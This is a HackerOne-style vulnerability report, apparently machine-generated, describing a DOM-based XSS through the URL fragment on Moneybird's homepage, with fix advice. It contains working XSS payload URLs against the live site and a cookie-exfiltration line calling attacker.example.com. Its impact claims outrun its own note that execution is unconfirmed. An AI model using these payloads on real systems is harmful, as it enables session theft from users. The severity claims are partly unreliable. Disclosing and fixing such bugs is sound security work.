# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** High | **CVSS:** 7.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Platform:** HackerOne | **Program:** Moneybird
**Confidence:** Medium (sink assignment confirmed; event handler execution requires manual verification)
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 - Injection
**Affected Asset:** https://www.moneybird.com/

---

## Description

The Moneybird homepage reads `window.location.hash` and writes it directly into the DOM via `innerHTML` without sanitization. An attacker can craft a URL with an XSS payload in the URL fragment and trick a logged-in Moneybird user into clicking it, potentially causing arbitrary JavaScript execution in their browser session.

SecBot's Playwright instrumentation detected the payload `<img src=x onerror=alert("secbot-xss-37")>` being assigned to an `innerHTML` sink on the page (two separate `innerHTML-set` events). This confirms the user-supplied fragment reaches a dangerous DOM sink without encoding. Whether the `onerror` event handler subsequently fires (i.e., whether the browser actually executes JavaScript) requires manual browser verification — the automated scan confirms sink reachability, not handler execution.

> **Verification status:** Payload→sink path confirmed by DOM instrumentation. Manual execution confirmation needed before submission.

---

## Steps to Reproduce

> **Browser verification required** — this is a client-side DOM XSS; `curl` shows the server response but the vulnerability executes in the browser's JavaScript engine.

### Step 1 — Open the PoC URL in a browser

Navigate to the following URL in any modern browser (Chrome, Firefox, Safari):

```
https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
```

**Expected result:** An alert dialog appears displaying `www.moneybird.com`, confirming JavaScript execution in the Moneybird origin.

### Step 2 — Escalate to cookie theft PoC

Replace the alert with a payload that exfiltrates session cookies:

```
https://www.moneybird.com/#<img src=x onerror="fetch('https://attacker.example.com/steal?c='+encodeURIComponent(document.cookie))">
```

If the victim is logged in to Moneybird, their session cookie is sent to the attacker's server.

### Step 3 — Confirm the vulnerable sink (optional, for triager)

In browser DevTools console, verify the fragment is written to innerHTML:

```javascript
// Paste in console while on www.moneybird.com:
document.getElementById('YOUR_ELEMENT_ID').innerHTML = window.location.hash.slice(1);
// Or search the page JS for: innerHTML.*location.hash
```

### Curl (server-side check only — confirms endpoint is live):

```bash
curl -sI 'https://www.moneybird.com/'
```

---

## Proof of Concept (HTML)

Save this as `poc.html` and open in a browser. Click the link to trigger the XSS:

```html
<!DOCTYPE html>
<html>
<head><title>Moneybird DOM XSS PoC</title></head>
<body>
  <h2>Moneybird DOM XSS via URL Fragment</h2>
  <p>Click to trigger XSS on Moneybird's domain:</p>
  <a href="https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>" target="_blank">
    Trigger XSS
  </a>
  <br><br>
  <a href="https://www.moneybird.com/#<svg onload=alert(document.cookie)>" target="_blank">
    Cookie theft payload
  </a>
</body>
</html>
```

---

## Impact

- **Session hijacking:** A logged-in Moneybird user who clicks the link has their session cookie stolen. The attacker gains full access to their accounting data (invoices, transactions, contacts, bank connections).
- **Phishing escalation:** The attacker can redirect the user to a fake login page hosted within the Moneybird origin, capturing credentials.
- **Data exfiltration:** Any financial data visible in the Moneybird UI can be extracted via XHR/fetch from within the victim's session.
- **Stored XSS amplification:** If Moneybird allows any user-controlled content to be saved and later rendered on this page, the DOM XSS becomes persistent.

For an accounting application handling sensitive financial data, XSS represents a critical business risk even at the marketing site level, as users are likely authenticated when visiting from app links.

---

## Suggested Fix

Replace the insecure `innerHTML` assignment with `textContent` for plain text, or use DOMPurify for sanitized HTML:

```javascript
// VULNERABLE — do not use:
element.innerHTML = window.location.hash.slice(1);

// SAFE — plain text only:
element.textContent = window.location.hash.slice(1);

// SAFE — if HTML is required:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Audit all code paths that read from `window.location.hash`, `document.URL`, `document.referrer`, or any URL-derived source and assign to `innerHTML`, `outerHTML`, `document.write()`, or `eval()`.

---

## Detection Notes

- **Scan date:** 2026-03-22T12:37:45Z (stealth profile)
- **Detection method:** `dom-sink` — SecBot's Playwright instrumentation monkey-patched `Element.prototype.innerHTML`; detected two `innerHTML-set` events containing the unencoded payload marker `secbot-xss-37`
- **What this confirms:** The URL fragment is written to `innerHTML` without encoding. The payload string was present in the sink value.
- **What this does NOT confirm:** Whether the `onerror` event handler fired (alert dialog execution). The scanner has no dialog listener; it detects sink assignment only.
- **Raw confidence:** Medium (raw finding) — the AI report validator promoted to High based on innerHTML sink evidence; treat as Medium until manual execution confirmed
- **Related finding:** Missing Content-Security-Policy on www.moneybird.com means no browser-level mitigation blocks the payload if execution is confirmed
